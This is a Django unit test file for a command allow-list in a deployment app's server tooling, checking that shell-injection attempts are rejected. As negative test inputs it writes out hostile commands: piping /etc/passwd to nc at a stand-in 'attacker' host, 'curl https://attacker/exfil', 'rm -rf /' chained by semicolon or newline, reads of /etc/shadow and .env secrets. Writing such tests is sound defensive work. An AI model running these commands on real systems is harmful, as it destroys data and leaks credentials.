
from django.test import TestCase

from apps.deployments.views.server.helpers import _is_command_allowed


class RunCommandSafetyTests(TestCase):
    def test_allows_docker_ps(self):
        self.assertTrue(_is_command_allowed("docker ps"))

    def test_allows_journalctl(self):
        self.assertTrue(_is_command_allowed("journalctl -u smsly-backend --no-pager -n 100"))

    def test_rejects_semicolon_chain(self):
        self.assertFalse(_is_command_allowed("cat /opt/smsly/.env; rm -rf /"))

    def test_rejects_pipe(self):
        self.assertFalse(_is_command_allowed("cat /etc/passwd | nc attacker 1234"))

    def test_rejects_dollar_paren(self):
        self.assertFalse(_is_command_allowed("echo $(cat /etc/shadow)"))

    def test_rejects_backticks(self):
        self.assertFalse(_is_command_allowed("echo `cat /etc/shadow`"))

    def test_rejects_redirect(self):
        self.assertFalse(_is_command_allowed("cat /etc/shadow > /tmp/leak"))

    def test_rejects_newline(self):
        self.assertFalse(_is_command_allowed("docker ps\nrm -rf /"))

    def test_rejects_unknown_command(self):
        self.assertFalse(_is_command_allowed("curl https://attacker/exfil"))

    def test_rejects_empty(self):
        self.assertFalse(_is_command_allowed(""))
        self.assertFalse(_is_command_allowed("   "))

    def test_rejects_cat_smsly_env_explicitly(self):
        """Even though 'cat' is on the safe list, the .env file must NOT be readable."""
        self.assertFalse(_is_command_allowed("cat /opt/smsly-hosting/.env"))
        self.assertFalse(_is_command_allowed("cat /opt/smsly/.env"))
